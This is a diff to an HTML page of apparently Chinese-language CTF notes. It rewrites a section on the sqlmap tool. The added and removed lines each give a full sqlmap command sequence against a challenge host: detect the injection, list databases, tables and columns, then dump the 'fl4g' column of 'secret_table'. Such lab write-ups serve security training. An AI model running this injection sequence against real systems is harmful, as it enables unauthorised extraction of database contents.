@@ -3906,18 +3906,13 @@ PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
 </ol>
 <details class="success" open="open"><summary>工具</summary><p><a href="http://sqlmap.org/">sqlmap</a>: 自动化SQL注入工具</p>
 <ol>
-<li>测试数据库类型及是否存在注入, 获取列数<code>python3 sqlmap.py -u "http://111.198.29.45:53232/index.php" --data "search=df"</code>
-1.获取注入点</li>
+<li>测试数据库类型及是否存在注入, 获取列数<code>python3 sqlmap.py -u "http://111.198.29.45:53232/index.php" --data "search=df"</code></li>
+<li>获取数据库名称<code>python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" --dbs</code></li>
+<li>获取指定数据库表名称<code>python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news --tables</code></li>
+<li>获取表内字段信息<code>python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table --columns</code></li>
+<li>获取字段内容，得到flag: <code>python3 sqlmap.py -u "http://111.198.29.45:33537/index.php" --data "search=df" -D news -T secret_table -C fl4g --dump</code></li>
 </ol>
-<p>sqlmap -u http://192.168.100.161:53459 --data "search=df"</p>
-<p>2.获取数据库信息</p>
-<p>sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs</p>
-<p>3.获取库内表信息</p>
-<p>sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables</p>
-<p>4.获取表内字段信息</p>
-<p>sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns</p>
-<p>5.获取字段内容，得到flag</p>
-<p>sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump</p>
+<p>参考链接: <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
 </details>
                 
                   
